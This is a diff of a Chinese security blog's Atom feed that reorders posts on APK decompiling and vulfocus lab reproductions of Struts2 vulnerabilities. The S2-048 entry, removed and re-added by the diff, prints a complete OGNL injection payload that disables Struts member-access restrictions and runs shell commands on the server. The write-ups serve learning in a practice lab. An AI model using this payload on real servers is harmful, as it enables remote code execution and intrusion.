@@ -6,7 +6,7 @@
   <link href="https://hzktester.top/atom.xml" rel="self"/>
   
   <link href="https://hzktester.top/"/>
-  <updated>2020-09-19T05:57:41.960Z</updated>
+  <updated>2020-09-18T11:40:52.401Z</updated>
   <id>https://hzktester.top/</id>
   
   <author>
@@ -15,29 +15,6 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title>欢迎来到我的博客</title>
-    <link href="https://hzktester.top/2020/09/17/about/%E5%85%B3%E4%BA%8E%E6%88%91/"/>
-    <id>https://hzktester.top/2020/09/17/about/%E5%85%B3%E4%BA%8E%E6%88%91/</id>
-    <published>2020-09-17T07:31:00.000Z</published>
-    <updated>2020-09-19T05:57:41.960Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="简单介绍下自己"><a href="#简单介绍下自己" class="headerlink" title="简单介绍下自己"></a>简单介绍下自己</h2><p>我的学历是大专，专业是“计算机信息技术”。毕业于2020年，90后的尾巴。</p><p>2020年4月开始入行网络安全圈子。本博客建立于2020年9月17日</p><p>专注于“网络安全”方向技术研究，web安全，内网渗透，APP渗透，代码审计，社工等。本博客也会主要记录这些内容</p><h2 id="经历、现状和计划"><a href="#经历、现状和计划" class="headerlink" title="经历、现状和计划"></a>经历、现状和计划</h2><h3 id="经历"><a href="#经历" class="headerlink" title="经历"></a>经历</h3><p>时间过得很快，出来工作也有2年左右了，这几年都发生了些什么，自己又做了哪些事。在这里简单回忆以下。</p><p>高中时候没好好读书，叛逆，上网，无所事事。因对计算机方面比较感兴趣，报了培训班学习java。培训结束后18年4月独自来到成都找工作，以为自己学的知识找一份工作没那么难。实践后也不容易，家里给的压力挺大的，也急于证明自己。</p><p>这里要特别感谢我人生的第一位恩人。topsec的一位经理。这么久过去了，可能他已经不记得我了，但我心里清楚，是他给了我一次机会，再造之恩。如果那时没找到一份工作生存下来该何去何从，有没有脸面回家。</p><p>在成都工作时，从事“软件测试”工作，从最初的黑盒测试，到自己研究python，自动化框架，发现行业现状并不理想，因所在的公司是做安全的，就去了解了“渗透测试”是做什么的。后来在某个“软件测试”了解到“城殷网络”的培训。今年4月入行。</p><h3 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h3><p>目前就职于一家网络安全公司，公司的师傅们都在行业有一定的成就，跟着他们潜心学习，记录知识。</p><h3 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h3><p>目前的计划主要是，入行时间较短，web渗透方面的基础不够，这段时间忙完后重新学习以下主要是SQL注入，XSS的漏洞挖掘。</p><p>还有最重要的：</p><ol><li>能够坚持写博客，记录学到的东西</li><li>不要再三天打鱼两天晒网了，决定要学的东西就要行动！！</li></ol><h2 id="希望在博客园结交哪类朋友呢？"><a href="#希望在博客园结交哪类朋友呢？" class="headerlink" title="希望在博客园结交哪类朋友呢？"></a>希望在博客园结交哪类朋友呢？</h2><ol><li>期待结交互相监督、互相鼓励一起坚持更新博客文章的朋友</li><li>期待结交从事IT行业的朋友，愿意喜欢结交网上朋友，时不时去聊聊天朋友圈分享日常的那种</li><li>行业大佬，带带弟弟好吗？</li></ol><p>先说到这，博客文章这个英雄之旅就此开始吧！祝大家都能成为行业大佬 嘻嘻</p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;简单介绍下自己&quot;&gt;&lt;a href=&quot;#简单介绍下自己&quot; class=&quot;headerlink&quot; title=&quot;简单介绍下自己&quot;&gt;&lt;/a&gt;简单介绍下自己&lt;/h2&gt;&lt;p&gt;我的学历是大专，专业是“计算机信息技术”。毕业于2020年，90后的尾巴。&lt;/p&gt;
-&lt;p&gt;2020年4月开始入行网络安全圈子。本博客建立于2020年9月17日&lt;/p&gt;
-&lt;p&gt;专注于“网络安全”方向技术研究，web安全，内网渗透，APP渗透，代码审计，社工等。本博客也会主要记录这些内容&lt;/p&gt;
-&lt;h2 id=&quot;经历、现状和计划&quot;&gt;&lt;a href=&quot;#经历、现状和计划&quot; class=&quot;headerlink&quot; title=&quot;经历、现状和计划&quot;&gt;&lt;/a&gt;经历、现状和计划&lt;/h2&gt;&lt;h3 id=&quot;经历&quot;&gt;&lt;a href=&quot;#经历&quot; class=&quot;headerlink&quot; title=&quot;经历&quot;&gt;&lt;/a&gt;经历&lt;/h3&gt;&lt;p&gt;时间过得很快，出来工作也有2年左右了，这几年都发生了些什么，自己又做了哪些事。在这里简单回忆以下。&lt;/p&gt;
-&lt;p&gt;高中时候没好好读书，叛逆，上网，无所事事。因对计算机方面比较感兴趣，报了培训班学习java。培训结束后18年4月独自来到成都找工作，以为自己学的知识找一份工作没那么难。实践后也不容易，家里给的压力挺大的，也急于证明自己。&lt;/p&gt;
-&lt;p&gt;这里要特别感谢我人生的第一位恩人。topsec的一位经理。这么久过去了，可能他已经不记得我了，但我心里清楚，是他给了我一次机会，再造之恩。如果那时没找到一份工作生存下来该何去何从，有没有脸面回家。&lt;/p&gt;
-&lt;p&gt;在成都工作时，从事“软件测试”工作，从最初的黑盒测试，到自己研究python，自动化框架，发现行业现状并不理想，因所在的公司是做安全的，就去了解了“渗透测试”是做什么的。后来在某个“软件测试”了解到“城殷网络”的培训。今年4月入行。&lt;/p&gt;</summary>
-    
-    
-    
-    
-  </entry>
   
   <entry>
     <title>APP之反编译+目录结构+重新打包+重新签名</title>
@@ -60,6 +37,30 @@
 &lt;li&gt;重新打包，默认输出&lt;strong&gt;qipai.apk&lt;/strong&gt;文件为当前目录&lt;blockquote&gt;
 &lt;p&gt;apktool b test&lt;/p&gt;
 &lt;/blockquote&gt;</summary>
+    
+    
+    
+    <category term="APP渗透" scheme="https://hzktester.top/categories/APP%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="APP反编译" scheme="https://hzktester.top/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>APP反编译-下载源码</title>
+    <link href="https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/"/>
+    <id>https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/</id>
+    <published>2020-08-16T07:31:00.000Z</published>
+    <updated>2020-09-18T11:41:04.722Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol><li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li><li>解压<strong>dex2jar.jar</strong>文件</li><li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li><li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081601.png" alt="image"></li><li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote><p>d2j-dex2jar.bat classes.dex</p></blockquote></li></ol><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081602.png" alt="image"></p><h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol><li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li><li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081603.png" alt="image"></li><li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;dex2jar工具&quot;&gt;&lt;a href=&quot;#dex2jar工具&quot; class=&quot;headerlink&quot; title=&quot;dex2jar工具&quot;&gt;&lt;/a&gt;dex2jar工具&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;下载&lt;a href=&quot;https://sourceforge.net/projects/dex2jar/&quot;&gt;https://sourceforge.net/projects/dex2jar/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;解压&lt;strong&gt;dex2jar.jar&lt;/strong&gt;文件&lt;/li&gt;
+&lt;li&gt;将&lt;strong&gt;shini.apk&lt;/strong&gt;文件后缀名修改为.rar然后解压</summary>
     
     
     
@@ -97,30 +98,6 @@
   </entry>
   
   <entry>
-    <title>APP反编译-下载源码</title>
-    <link href="https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/"/>
-    <id>https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/</id>
-    <published>2020-08-16T07:31:00.000Z</published>
-    <updated>2020-09-18T11:41:04.722Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol><li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li><li>解压<strong>dex2jar.jar</strong>文件</li><li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li><li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081601.png" alt="image"></li><li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote><p>d2j-dex2jar.bat classes.dex</p></blockquote></li></ol><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081602.png" alt="image"></p><h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol><li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li><li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081603.png" alt="image"></li><li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li></ol>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;dex2jar工具&quot;&gt;&lt;a href=&quot;#dex2jar工具&quot; class=&quot;headerlink&quot; title=&quot;dex2jar工具&quot;&gt;&lt;/a&gt;dex2jar工具&lt;/h2&gt;&lt;ol&gt;
-&lt;li&gt;下载&lt;a href=&quot;https://sourceforge.net/projects/dex2jar/&quot;&gt;https://sourceforge.net/projects/dex2jar/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;解压&lt;strong&gt;dex2jar.jar&lt;/strong&gt;文件&lt;/li&gt;
-&lt;li&gt;将&lt;strong&gt;shini.apk&lt;/strong&gt;文件后缀名修改为.rar然后解压</summary>
-    
-    
-    
-    <category term="APP渗透" scheme="https://hzktester.top/categories/APP%E6%B8%97%E9%80%8F/"/>
-    
-    
-    <category term="APP反编译" scheme="https://hzktester.top/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
-    
-  </entry>
-  
-  <entry>
     <title>S2-019 CVE-2013-4316复现过程</title>
     <link href="https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
     <id>https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
@@ -132,28 +109,6 @@
     
     <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中&lt;/p&gt;
 &lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.0.0 - 2.3.15.1&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
-    
-    
-    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>S2-048 CVE-2017-9791复现过程</title>
-    <link href="https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
-    <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-18T11:42:32.170Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li><p>使用vulfocus启动漏洞环境，选择Integration中的Struts 1 Integration<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081407.png" alt="image"></p></li><li><p>随意输入内容，使用burp抓取“submit”的数据包</p></li><li><p>poc利用</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081408.png" alt="image"></p><p>或直接使用工具<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081409.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本&lt;/p&gt;</summary>
     
     
     
@@ -208,17 +163,17 @@
   </entry>
   
   <entry>
-    <title>S2-052 CVE-2017-9805复现过程</title>
-    <link href="https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <title>S2-048 CVE-2017-9791复现过程</title>
+    <link href="https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-18T11:42:30.256Z</updated>
+    <updated>2020-09-18T11:42:32.170Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33<br>Struts 2.5 - Struts 2.5.12</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081410.png" alt="image"></p></li><li><p>使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081411.png" alt="image"></p></li></ol>]]></content>
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li><p>使用vulfocus启动漏洞环境，选择Integration中的Struts 1 Integration<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081407.png" alt="image"></p></li><li><p>随意输入内容，使用burp抓取“submit”的数据包</p></li><li><p>poc利用</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081408.png" alt="image"></p><p>或直接使用工具<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081409.png" alt="image"></p>]]></content>
     
     
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.1.2 - Struts 2.3.33&lt;br&gt;Struts 2.5 - Struts 2.5.12&lt;/p&gt;</summary>
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本&lt;/p&gt;</summary>
     
     
     
@@ -241,6 +196,28 @@
     
     <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。&lt;/p&gt;
 &lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.0.1-2.3.33&lt;br&gt;Struts 2.5-2.5.10&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    
+    
+    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>S2-052 CVE-2017-9805复现过程</title>
+    <link href="https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <published>2020-08-14T07:31:00.000Z</published>
+    <updated>2020-09-18T11:42:30.256Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33<br>Struts 2.5 - Struts 2.5.12</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081410.png" alt="image"></p></li><li><p>使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081411.png" alt="image"></p></li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.1.2 - Struts 2.3.33&lt;br&gt;Struts 2.5 - Struts 2.5.12&lt;/p&gt;</summary>
     
     
     
